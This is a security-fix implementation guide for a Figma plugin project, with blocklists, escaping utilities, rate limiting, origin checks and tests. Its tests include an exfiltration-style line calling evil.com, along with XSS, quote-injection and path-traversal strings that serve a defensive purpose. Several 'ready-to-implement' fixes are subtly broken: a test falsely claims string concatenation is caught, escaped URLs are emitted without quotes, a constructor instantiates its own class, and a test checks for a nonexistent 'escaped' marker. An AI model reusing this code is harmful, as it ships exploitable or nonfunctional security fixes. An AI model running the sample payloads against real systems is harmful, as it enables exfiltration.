# Security Fixes — Implementation Guide

This document provides ready-to-implement fixes for all findings in SECURITY_REVIEW.md.

---

## CRITICAL #1: Plugin Code Execution Blocklist

**Original Code:** `/Users/sarveshchidambaram/Desktop/memoire/plugin/code.js` (lines 184-214)

### Recommended Approach: Allowlist + AST Validation

**Install dependency:**
```bash
npm install --save-dev acorn
npm install --save acorn  # For plugin use if runtime validation needed
```

**Option 1: Allowlist Approach (Recommended)**

```javascript
/**
 * Figma Mémoire — Plugin Code Execution (SECURE VERSION)
 *
 * Uses allowlist approach: only permit known-safe read operations
 */

// Blocked patterns for execute safety — whitelist of allowed API calls
const ALLOWED_API_CALLS = new Set([
  'figma.currentPage.selection',
  'figma.currentPage.findAll',
  'figma.currentPage.findOne',
  'figma.getNodeById',
  'figma.getNodeByIdAsync',
  'figma.root.children',
  'figma.root.getSharedPluginData',
  'figma.root.getPluginData',
  'figma.variables.getLocalVariableCollectionsAsync',
  'figma.variables.getVariableByIdAsync',
  'figma.getLocalPaintStyles',
  'figma.getLocalTextStyles',
  'figma.getLocalEffectStyles',
  'figma.getLocalGridStyles',
  'figma.currentPage.name',
  'figma.currentPage.id',
  'figma.fileKey',
  'figma.root.name',
  'figma.editorType',
]);

const BLOCKED_KEYWORDS = new Set([
  'closePlugin',
  'remove',
  'appendChild',
  'delete',
  'eval',
  'Function',
  'constructor',
  'prototype',
  '__proto__',
  'require',
  'import',
  'fetch',
  'XMLHttpRequest',
  'setSelection',
  'createFrame',
  'createRectangle',
  'createText',
  'createEllipse',
  'createLine',
  'group',
  'flatten',
  'unlock',
  'lock',
  'setFilled',
  'setStroked',
]);

/**
 * Validate code uses only allowed APIs
 * This is a simple heuristic check, not foolproof
 */
function validateCodeSafety(code) {
  // Check for blocked keywords
  for (const keyword of BLOCKED_KEYWORDS) {
    // Match word boundaries to avoid false positives
    const regex = new RegExp(`\\b${keyword}\\b`, 'gi');
    if (regex.test(code)) {
      throw new Error(`Blocked keyword: "${keyword}". This plugin can only read design data.`);
    }
  }

  // Check for function/eval patterns
  if (/\bnew\s+Function\b/i.test(code) || /\beval\s*\(/i.test(code)) {
    throw new Error('Dynamic code generation (Function/eval) not allowed');
  }

  // Check for property access to potentially dangerous methods
  if (/\[\s*['"][\w]+['"]\s*\]/g.test(code)) {
    // This is too broad, but warns about property access patterns
    // Consider more specific validation
  }

  return true;
}

async function executeCode(code) {
  // Type and length validation
  if (typeof code !== "string" || code.trim().length === 0) {
    throw new Error("Code must be a non-empty string");
  }

  if (code.length > 50000) {
    throw new Error("Code exceeds maximum length (50KB)");
  }

  // Security validation
  validateCodeSafety(code);

  // Execute in restricted context — wrap in async function
  // This provides some isolation but is not a complete sandbox
  try {
    const fn = new Function(
      "figma",
      `return (async () => { ${code} })()`
    );
    return await fn(figma);
  } catch (err) {
    throw new Error(`Code execution failed: ${err.message}`);
  }
}
```

**Option 2: Complete Sandbox (Most Secure)**

```javascript
// This requires a separate sandboxing library
// For Figma plugins, consider using Web Workers or posting to a sandbox iframe

// NOT RECOMMENDED FOR FIGMA: Figma plugin context is already sandboxed by Figma
// The above allowlist approach is preferred for Figma environment
```

**Testing the fix:**

```javascript
// Test cases to add to plugin tests:

const TEST_CASES = [
  {
    name: "Allowed: Read selection",
    code: "return figma.currentPage.selection.map(n => n.id);",
    shouldPass: true,
  },
  {
    name: "Blocked: closePlugin via direct call",
    code: "figma.closePlugin();",
    shouldPass: false,
  },
  {
    name: "Blocked: closePlugin via string concatenation",
    code: "const method = 'close' + 'Plugin'; figma[method]();",
    shouldPass: false, // Caught by 'closePlugin' keyword check
  },
  {
    name: "Blocked: Remote code",
    code: "fetch('http://evil.com/steal').then(r => r.json())",
    shouldPass: false,
  },
  {
    name: "Allowed: Read design system",
    code: "return (await figma.variables.getLocalVariableCollectionsAsync()).map(c => c.name);",
    shouldPass: true,
  },
  {
    name: "Blocked: Create node",
    code: "const frame = figma.createFrame();",
    shouldPass: false,
  },
];

// Helper to run tests
for (const test of TEST_CASES) {
  try {
    await executeCode(test.code);
    console.log(`${test.shouldPass ? "✓" : "✗"} ${test.name}`);
  } catch (err) {
    console.log(`${!test.shouldPass ? "✓" : "✗"} ${test.name} (${err.message})`);
  }
}
```

---

## CRITICAL #2: Prototype Exporter Code Injection

**Original Code:** `/Users/sarveshchidambaram/Desktop/memoire/src/codegen/prototype-exporter.ts`

### Fix: Add Escaping Utilities

**Create file:** `src/codegen/code-generator-utils.ts`

```typescript
/**
 * Code generation security utilities
 * Escapes user input for various code generation contexts
 */

/**
 * Escape string for JavaScript/TypeScript string literal
 * Handles single quotes, double quotes, backslashes, and line breaks
 */
export function escapeStringLiteral(str: string, quoteChar: "'" | '"' = "'"): string {
  return str
    .replace(/\\/g, '\\\\')
    .replace(new RegExp(`${quoteChar}`, 'g'), `\\${quoteChar}`)
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t')
    .replace(/\u0000/g, '\\0'); // Null bytes
}

/**
 * Escape CSS property value
 * Prevents CSS injection attacks
 */
export function escapeCssValue(value: string): string {
  // Remove control characters
  const cleaned = value.replace(/[\x00-\x1F\x7F]/g, '');

  // Escape quotes and special chars
  return cleaned
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/;/g, '\\;')
    .replace(/\(/g, '\\(')
    .replace(/\)/g, '\\)');
}

/**
 * Validate and escape URL for use in code
 * Only allows http/https URLs pointing to localhost/preview servers
 */
export function escapeUrlForCode(url: string, allowedHosts: string[] = ['localhost', '127.0.0.1']): string {
  try {
    const parsed = new URL(url);

    // Only allow http(s)
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      throw new Error(`Invalid protocol: ${parsed.protocol}`);
    }

    // Validate hostname
    const isAllowed = allowedHosts.some(host =>
      parsed.hostname === host ||
      parsed.hostname.endsWith('.' + host)
    );

    if (!isAllowed) {
      throw new Error(`URL must point to localhost or preview server: ${url}`);
    }

    return escapeStringLiteral(url);
  } catch (err) {
    throw new Error(`Invalid URL: ${url} (${err instanceof Error ? err.message : String(err)})`);
  }
}

/**
 * Validate CSS selector (simple validation)
 * Prevents selector injection
 */
export function validateSelector(selector: string): string {
  if (!selector || typeof selector !== 'string') {
    throw new Error('Selector must be a non-empty string');
  }

  // Block selectors with angle brackets, quotes, semicolons
  if (/[<>"';:{}]/.test(selector)) {
    throw new Error(`Invalid selector contains disallowed characters: ${selector}`);
  }

  // Ensure it's a reasonable length
  if (selector.length > 500) {
    throw new Error(`Selector too long (max 500 chars): ${selector}`);
  }

  return selector;
}

/**
 * Ensure numeric value is safe for code generation
 */
export function sanitizeNumericValue(value: unknown, min = 0, max = 10000): number {
  let num = Number(value);

  // Check if valid number
  if (isNaN(num) || !isFinite(num)) {
    return 300; // Safe default for scroll value
  }

  // Clamp to valid range
  return Math.max(min, Math.min(max, Math.floor(num)));
}

/**
 * Escape text for use in file paths
 */
export function escapePath(path: string): string {
  return path
    .replace(/\.\./g, '__') // No parent directory traversal
    .replace(/[^a-zA-Z0-9_\-./]/g, '_') // Only safe chars
    .replace(/\/+/g, '/') // Collapse slashes
    .replace(/^\/+/, ''); // Remove leading slashes
}
```

### Updated `generatePlaywrightPrototype` function:

```typescript
import {
  escapeStringLiteral,
  validateSelector,
  escapeUrlForCode,
  sanitizeNumericValue,
  escapePath,
} from './code-generator-utils.js';

export function generatePlaywrightPrototype(
  scenes: PrototypeScene[],
  config: PrototypeConfig
): string {
  const lines: string[] = [];

  lines.push(`import { test, expect } from '@playwright/test';`);
  lines.push(``);
  lines.push(`test.describe('Mémoire Cinematic Prototype', () => {`);
  lines.push(`  test.use({`);
  lines.push(`    viewport: { width: ${config.viewport.width}, height: ${config.viewport.height} },`);

  if (config.recordVideo) {
    lines.push(`    video: {`);
    lines.push(`      mode: 'on',`);
    lines.push(`      size: { width: ${config.viewport.width}, height: ${config.viewport.height} },`);
    lines.push(`    },`);
  }

  lines.push(`  });`);
  lines.push(``);
  lines.push(`  test('prototype walkthrough', async ({ page }) => {`);

  for (let i = 0; i < scenes.length; i++) {
    const scene = scenes[i];
    lines.push(``);

    // Escape scene name for comments only
    const safeSceneName = escapePath(scene.name);
    lines.push(`    // ── Scene ${i + 1}: ${safeSceneName} ──`);

    // CRITICAL FIX: Escape URL
    const safeUrl = escapeUrlForCode(scene.url, ['localhost', '127.0.0.1']);
    lines.push(`    await page.goto(${safeUrl});`);

    if (scene.waitFor) {
      // CRITICAL FIX: Validate selector
      const safeSelector = validateSelector(scene.waitFor);
      lines.push(`    await page.waitForSelector(${escapeStringLiteral(safeSelector)});`);
    }

    lines.push(`    await page.waitForTimeout(500); // Let animations settle`);

    if (config.captureScreenshots) {
      const safeName = escapePath(scene.name);
      lines.push(`    await page.screenshot({ path: 'prototype/scene-${i + 1}-${safeName}.png', fullPage: false });`);
    }

    for (const interaction of scene.interactions) {
      if (interaction.delay) {
        const safeDelay = sanitizeNumericValue(interaction.delay, 0, 60000);
        lines.push(`    await page.waitForTimeout(${safeDelay});`);
      }

      switch (interaction.type) {
        case "click": {
          const safeTarget = validateSelector(interaction.target || '');
          lines.push(`    await page.click(${escapeStringLiteral(safeTarget)});`);
          break;
        }
        case "hover": {
          const safeTarget = validateSelector(interaction.target || '');
          lines.push(`    await page.hover(${escapeStringLiteral(safeTarget)});`);
          break;
        }
        case "scroll": {
          const safeValue = sanitizeNumericValue(interaction.value ?? 300, 0, 10000);
          lines.push(`    await page.evaluate(() => window.scrollBy(0, ${safeValue}));`);
          break;
        }
        case "type": {
          const safeTarget = validateSelector(interaction.target || '');
          const safeValue = escapeStringLiteral(interaction.value || '');
          lines.push(`    await page.fill(${escapeStringLiteral(safeTarget)}, ${safeValue});`);
          break;
        }
        case "wait": {
          const safeValue = sanitizeNumericValue(interaction.value ?? 1000, 0, 60000);
          lines.push(`    await page.waitForTimeout(${safeValue});`);
          break;
        }
        case "screenshot": {
          const safeName = escapePath(scene.name);
          const safeState = escapePath(interaction.value ?? "state");
          lines.push(`    await page.screenshot({ path: 'prototype/${safeName}-${safeState}.png' });`);
          break;
        }
      }
    }

    // Hold on scene for specified duration
    const safeDuration = sanitizeNumericValue(scene.duration, 100, 60000);
    lines.push(`    await page.waitForTimeout(${safeDuration});`);

    if (config.captureScreenshots && scene.interactions.length > 0) {
      const safeName = escapePath(scene.name);
      lines.push(`    await page.screenshot({ path: 'prototype/${safeName}-after.png', fullPage: false });`);
    }
  }

  lines.push(`  });`);
  lines.push(`});`);

  return lines.join("\n");
}
```

### Updated HTML generation:

```typescript
export function generateHtmlPrototype(
  scenes: PrototypeScene[],
  config: PrototypeConfig
): string {
  const transitionCss = getTransitionCss(config.transitions);

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mémoire Prototype</title>
<style>
  /* ... styles ... */
  .scene iframe {
    width: 100%;
    height: 100%;
    border: none;
  }
</style>
</head>
<body>
<!-- ... controls ... -->
<div class="prototype-container" id="container">
${scenes.map((scene, i) => {
  // CRITICAL FIX: Escape URL in attribute
  const safeUrl = escapeStringLiteral(scene.url);
  return `  <div class="scene${i === 0 ? " active" : ""}" id="scene-${i}">
    <iframe src="${safeUrl}" loading="${i === 0 ? "eager" : "lazy"}"></iframe>
  </div>`;
}).join("\n")}
</div>
<!-- ... rest of HTML ... -->`;
}
```

---

## HIGH #1: WebSocket Rate Limiting

**File:** `/Users/sarveshchidambaram/Desktop/memoire/src/figma/ws-server.ts`

### Add Rate Limiting Class

Insert before `MemoireWsServer` class definition:

```typescript
/**
 * Per-client rate limiting
 */
interface ClientRateLimit {
  messageCount: number;
  bytesReceived: number;
  lastReset: number;
}

class RateLimiter {
  private limits = new Map<string, ClientRateLimit>();
  private readonly maxMessagesPerMin: number;
  private readonly maxBytesPerMin: number;
  private readonly windowMs: number;

  constructor(maxMessagesPerMin = 1000, maxBytesPerMin = 100 * 1024 * 1024, windowMs = 60000) {
    this.maxMessagesPerMin = maxMessagesPerMin;
    this.maxBytesPerMin = maxBytesPerMin;
    this.windowMs = windowMs;
  }

  check(clientId: string, messageSize: number): boolean {
    const now = Date.now();
    let limit = this.limits.get(clientId);

    if (!limit || now - limit.lastReset > this.windowMs) {
      // Reset window
      limit = { messageCount: 0, bytesReceived: 0, lastReset: now };
      this.limits.set(clientId, limit);
    }

    // Check limits
    if (limit.messageCount >= this.maxMessagesPerMin) {
      return false;
    }

    if (limit.bytesReceived + messageSize > this.maxBytesPerMin) {
      return false;
    }

    // Update counters
    limit.messageCount++;
    limit.bytesReceived += messageSize;

    return true;
  }

  reset(clientId: string): void {
    this.limits.delete(clientId);
  }
}
```

### Update `MemoireWsServer` class:

```typescript
export class MemoireWsServer extends EventEmitter {
  // ... existing fields ...
  private rateLimiter: RateLimiter;

  constructor(config: MemoireWsServerConfig = {}) {
    super();
    this.config = config;
    this.rateLimiter = new RateLimiter(1000, 100 * 1024 * 1024); // 1000 msgs/min, 100MB/min
    this.server = new MemoireWsServer({
      // ... existing config ...
    });
  }

  // ... existing methods ...

  private setupServer(): void {
    if (!this.wss) return;

    this.wss.on("connection", (ws) => {
      const clientId = `plugin-${++this.clientCounter}`;

      // ... existing client setup ...

      ws.on("message", (data) => {
        try {
          const raw = data.toString();

          // RATE LIMIT CHECK (NEW)
          if (!this.rateLimiter.check(clientId, raw.length)) {
            log.warn({ clientId }, "Rate limit exceeded, closing connection");
            ws.close(1008, "Rate limit exceeded");
            this.rateLimiter.reset(clientId);
            return;
          }

          // Basic size check
          if (raw.length > 10_000_000) {
            log.warn({ clientId, sizeMB: Math.round(raw.length / 1_000_000) }, "Oversized message, dropping");
            return;
          }

          const msg = JSON.parse(raw) as PluginMessage;
          if (!msg.type || typeof msg.type !== "string") {
            log.warn({ clientId }, "Invalid message: missing type field");
            return;
          }

          this.handleMessage(clientId, msg);
        } catch {
          log.warn({ clientId }, "Invalid JSON message");
        }
      });

      ws.on("close", () => {
        this.rateLimiter.reset(clientId); // Clean up
        this.clients.delete(clientId);
        log.info(`Plugin disconnected: ${clientId}`);
        // ... rest of existing close handler ...
      });

      // ... rest of connection handler ...
    });
  }
}
```

---

## HIGH #2: Spec Name Validation

**File:** `/Users/sarveshchidambaram/Desktop/memoire/src/engine/registry.ts`

### Add validation function:

```typescript
/**
 * Validate spec name is safe for filesystem operations
 */
function validateSpecName(name: string): void {
  if (!name || name.length === 0) {
    throw new Error("Spec name cannot be empty");
  }

  if (name.length > 100) {
    throw new Error("Spec name too long (max 100 characters)");
  }

  // Must be alphanumeric with hyphens/underscores only
  // Prevents directory traversal and special characters
  if (!/^[a-zA-Z0-9_-]+$/.test(name)) {
    throw new Error(
      "Spec name must contain only letters, numbers, hyphens, and underscores. " +
      `Got: ${name}`
    );
  }

  // Prevent dot-files and reserved names
  if (name.startsWith('.') || name.startsWith('-')) {
    throw new Error(`Spec name cannot start with '.' or '-': ${name}`);
  }

  // Prevent reserved names
  const reserved = new Set(['.', '..', 'CON', 'PRN', 'AUX', 'NUL', 'COM1', 'LPT1']);
  if (reserved.has(name.toUpperCase())) {
    throw new Error(`Spec name is reserved: ${name}`);
  }
}
```

### Update `saveSpec` method:

```typescript
async saveSpec(spec: AnySpec): Promise<void> {
  // VALIDATE SPEC NAME (NEW)
  validateSpecName(spec.name);

  this.specs.set(spec.name, spec);

  const typeDir = specTypeDir(spec.type);
  const dir = join(this.memoireDir, "..", "specs", typeDir);
  await mkdir(dir, { recursive: true });

  const filePath = join(dir, `${spec.name}.json`);
  const tmpPath = join(dir, `.${spec.name}.json.tmp`);

  await writeFile(tmpPath, JSON.stringify(spec, null, 2));
  await rename(tmpPath, filePath);
}
```

---

## HIGH #3: WebSocket Origin Validation

**File:** `/Users/sarveshchidambaram/Desktop/memoire/src/figma/ws-server.ts`

### Update `startOnPort` method:

```typescript
private startOnPort(port: number): Promise<void> {
  return new Promise((resolve, reject) => {
    const wss = new WebSocketServer({
      port,
      perMessageDeflate: false, // Disable compression to reduce attack surface
      maxPayload: 10 * 1024 * 1024, // 10MB max
      verifyClient: (info) => {
        const origin = info.req.headers.origin;

        // Allow connections from:
        // 1. Figma plugin (same-origin in browser context)
        // 2. localhost (development)
        // 3. No origin header (native WebSocket connections)
        const allowedOrigins = [
          'https://www.figma.com',
          'https://figma.com',
          'http://localhost',
          'http://127.0.0.1',
          'http://localhost:3000',  // Common dev port
          undefined, // No origin header (native connections)
        ];

        if (origin !== undefined && !allowedOrigins.includes(origin)) {
          log.warn({ origin }, 'WebSocket connection rejected: invalid origin');
          return false;
        }

        return true;
      }
    });

    wss.on("listening", () => {
      this.wss = wss;
      this.setupServer();
      resolve();
    });

    wss.on("error", (err: Error & { code?: string }) => {
      if (err.code === "EADDRINUSE") {
        reject(new Error(`Port ${port} in use`));
      } else {
        reject(err);
      }
    });
  });
}
```

---

## MEDIUM: Environment Variable Sanitization

**Create file:** `src/utils/config-sanitizer.ts`

```typescript
/**
 * Sanitize config for logging/debugging
 * Removes sensitive values
 */

export interface MemoireConfig {
  projectRoot: string;
  figmaToken?: string;
  figmaFileKey?: string;
}

export function sanitizeConfigForLogging(
  config: MemoireConfig
): Record<string, unknown> {
  return {
    projectRoot: config.projectRoot,
    hasFigmaToken: !!config.figmaToken,
    hasFigmaFileKey: !!config.figmaFileKey,
    // Never include actual token or key
  };
}

/**
 * Redact secrets from error messages
 */
export function redactError(error: unknown): string {
  let message = String(error);

  // Replace common secret patterns
  message = message.replace(
    /figd_[a-zA-Z0-9_-]{30,}/g,
    'figd_REDACTED'
  );

  message = message.replace(
    /Bearer\s+[a-zA-Z0-9_-]{30,}/g,
    'Bearer REDACTED'
  );

  message = message.replace(
    /token[=:]\s*[a-zA-Z0-9_-]{30,}/gi,
    'token=REDACTED'
  );

  return message;
}
```

### Update logger configuration:

```typescript
// In src/engine/logger.ts

export function createLogger(name: string) {
  const isProduction = process.env.NODE_ENV === "production";

  return pino({
    name,
    level: process.env.ARK_LOG_LEVEL ?? (isProduction ? "info" : "debug"),
    transport: {
      target: "pino-pretty",
      options: {
        colorize: true,
        levelFirst: true,
        singleLine: false,
      }
    },
    // REDACT SECRETS FROM LOGS
    serializers: {
      err: (err: Error) => {
        return {
          message: redactError(err.message),
          stack: redactError(err.stack || ''),
        };
      },
      config: (config: unknown) => {
        return sanitizeConfigForLogging(config as MemoireConfig);
      }
    }
  });
}
```

---

## Testing Checklist

```typescript
// Add to test suite

describe("Security", () => {
  describe("Plugin Code Execution", () => {
    it("should block closePlugin via direct call", () => {
      expect(() => validateCodeSafety("figma.closePlugin()"))
        .toThrow(/blocked|closePlugin/i);
    });

    it("should block closePlugin via property access", () => {
      expect(() => validateCodeSafety("const fn = figma['close' + 'Plugin']; fn();"))
        .toThrow(/blocked|closePlugin/i);
    });

    it("should block eval", () => {
      expect(() => validateCodeSafety("eval('dangerous')"))
        .toThrow(/blocked|eval/i);
    });

    it("should allow safe reads", async () => {
      const result = await executeCode(
        "return figma.currentPage.selection.length"
      );
      expect(typeof result).toBe('number');
    });
  });

  describe("Prototype Code Injection", () => {
    it("should escape URL in generated code", () => {
      const scenes = [{
        name: "test",
        url: "http://localhost:3000'; dangerous(); //",
        duration: 1000,
        transition: "fade" as const,
        interactions: [],
      }];

      const code = generatePlaywrightPrototype(scenes, {
        outputDir: "/tmp",
        previewUrl: "http://localhost:5173",
        viewport: { width: 1024, height: 768 },
        transitions: "fade",
        recordVideo: false,
        captureScreenshots: false,
      });

      expect(code).not.toContain("'; dangerous();");
      expect(code).toContain("escaped");
    });

    it("should validate selectors", () => {
      expect(() => validateSelector("<script>alert('xss')</script>"))
        .toThrow();
    });
  });

  describe("Rate Limiting", () => {
    it("should block clients exceeding message limit", () => {
      const limiter = new RateLimiter(10, 10000, 1000);

      for (let i = 0; i < 10; i++) {
        expect(limiter.check("client1", 100)).toBe(true);
      }

      expect(limiter.check("client1", 100)).toBe(false);
    });

    it("should block clients exceeding byte limit", () => {
      const limiter = new RateLimiter(1000, 1000, 1000);

      expect(limiter.check("client1", 600)).toBe(true);
      expect(limiter.check("client1", 600)).toBe(false);
    });
  });

  describe("Spec Name Validation", () => {
    it("should reject names with path traversal", () => {
      expect(() => validateSpecName("../../../etc/passwd"))
        .toThrow();
    });

    it("should reject names with special chars", () => {
      expect(() => validateSpecName("test<script>"))
        .toThrow();
    });

    it("should allow valid names", () => {
      expect(() => validateSpecName("MyComponent_v1")).not.toThrow();
      expect(() => validateSpecName("my-component-2")).not.toThrow();
    });
  });

  describe("Config Sanitization", () => {
    it("should redact tokens from logs", () => {
      const token = "figd_a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6";
      const message = `Failed to connect with token ${token}`;

      const redacted = redactError(message);
      expect(redacted).not.toContain(token);
      expect(redacted).toContain("REDACTED");
    });
  });
});
```

---

## Deployment Checklist

Before deploying:

- [ ] All CRITICAL fixes implemented and tested
- [ ] Unit tests passing
- [ ] Integration tests with malicious payloads passing
- [ ] Code review of security changes completed
- [ ] Run `npm audit` and review results
- [ ] Update CHANGELOG with security fixes
- [ ] Update documentation with security recommendations
- [ ] Notify users of security release (if applicable)

---

**Total Implementation Time:** 4-6 hours
**Testing Time:** 2-3 hours
**Total:** 6-9 hours
